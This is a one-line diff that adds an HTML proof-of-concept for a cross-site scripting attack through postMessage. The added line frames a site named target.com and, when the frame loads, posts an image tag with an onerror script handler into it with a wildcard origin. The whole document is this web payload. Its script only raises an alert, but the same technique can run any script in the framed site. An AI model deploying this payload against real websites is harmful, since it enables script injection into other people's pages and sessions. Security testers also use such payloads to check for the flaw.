@@ -1,0 +1,1 @@
+<iframe src="https://target.com" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')">
